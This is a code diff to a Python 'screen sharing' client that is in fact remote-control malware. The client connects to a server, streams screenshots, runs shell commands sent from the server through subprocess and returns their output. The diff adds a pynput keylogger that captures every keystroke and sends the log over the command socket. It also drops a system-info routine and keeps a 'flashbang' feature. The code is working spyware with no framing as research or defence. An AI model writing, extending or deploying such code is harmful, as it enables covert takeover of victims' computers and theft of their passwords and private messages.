@@ -6,12 +6,11 @@ import threading
 import time
 import platform
 import tkinter as tk
-import tkinter.font as Font
-from tkinter import ttk
 from tkinter import messagebox as messagebox
-import asyncio
 import os
 import subprocess
+from pynput import keyboard
+import asyncio
 
 
 class ScreenSharingClient:
@@ -32,23 +31,12 @@ class ScreenSharingClient:
             self.command_socket.connect((self.server_ip, self.command_port))
             self.image_socket.connect((self.server_ip, self.image_port))
             print("Connected to server")
-            self.send_system_info()
+            self.start_screen_share()
             threading.Thread(target=self.receive_commands).start()
         except Exception as e:
             print(f"Error connecting to server: {e}")
             self.command_socket.close()
             self.image_socket.close()
-
-    def send_system_info(self):
-        try:
-            system_info = self.get_system_info()
-            self.command_socket.send(system_info.encode("utf-8"))
-            acknowledgment = self.command_socket.recv(1024).decode("utf-8")
-            if acknowledgment.lower() == "received":
-                self.start_screen_share()
-        except Exception as e:
-            print(f"Error sending system info: {e}")
-            self.command_socket.close()
 
     def receive_commands(self):
         try:
@@ -88,6 +76,7 @@ class ScreenSharingClient:
                 data = buffer.getvalue()
                 size = len(data)
 
+                print(size)
                 self.image_socket.sendall(size.to_bytes(4, "big"))
                 self.image_socket.sendall(data)
                 time.sleep(0.001)
@@ -104,9 +93,9 @@ class ScreenSharingClient:
                 if os.path.isdir(new_dir):
                     os.chdir(new_dir)
                     self.current_directory = new_dir
-                    response = f"CMDOUTPUTDirectory changed to: {new_dir}"
+                    response = f"[CMDOUT]Directory changed to: {new_dir}"
                 else:
-                    response = f"CMDOUTPUTDirectory not found: {new_dir}"
+                    response = f"[CMDOUT]Directory not found: {new_dir}"
             else:
                 # Execute the command synchronously
                 process = subprocess.Popen(
@@ -122,26 +111,15 @@ class ScreenSharingClient:
                 stdout_str = stdout
                 stderr_str = stderr
                 if process.returncode == 0:
-                    response = f"CMDOUTPUT{stdout_str}"
+                    response = f"[CMDOUT]{stdout_str}"
                 else:
-                    response = f"CMDOUTPUTError: {stderr_str}"
+                    response = f"[CMDOUT]Error: {stderr_str}"
 
             return response
 
         except Exception as e:
-            error_message = f"CMDOUTPUTError: {e}"
+            error_message = f"[CMDOUT]Error: {e}"
             return error_message
-
-    def get_system_info(self):
-        system_info = {
-            "System Name": platform.node(),
-            "System": platform.system(),
-            "OS Release": platform.release(),
-            "OS Version": platform.version(),
-            "Machine Type": platform.machine(),
-            "CPU": platform.processor(),
-        }
-        return str(system_info)
 
     def trigger_flashbang(self):
         if hasattr(self, "error_box") and self.error_box.winfo_exists():
@@ -174,5 +152,44 @@ class ScreenSharingClient:
                 self.screenshot_thread.join()
 
 
+class Keylogger:
+    def __init__(self):
+        self.log = []
+        self.lock = threading.Lock()
+
+    def on_press(self, key):
+        try:
+            char = key.char
+            entry = f"Key pressed: {char}"
+        except AttributeError:
+            entry = f"Special key pressed: {key}"
+
+        with self.lock:
+            self.log.append(entry)
+
+    async def send_log(self):
+        while True:
+            if self.log:
+                log_data = "\n".join(self.log)
+                client.command_socket.send(f"[LOG]{log_data}".encode("utf-8"))
+                print("log sent")
+                self.log = []
+
+    def start_key_logger(self):
+        listener = keyboard.Listener(on_press=self.on_press)
+        listener.start()
+
+
+async def main():
+    logger = Keylogger()
+
+    logger_thread = threading.Thread(target=logger.start_key_logger)
+    logger_thread.daemon = True
+    logger_thread.start()
+
+    await logger.send_log()
+
+
 if __name__ == "__main__":
     client = ScreenSharingClient()
+    asyncio.run(main())
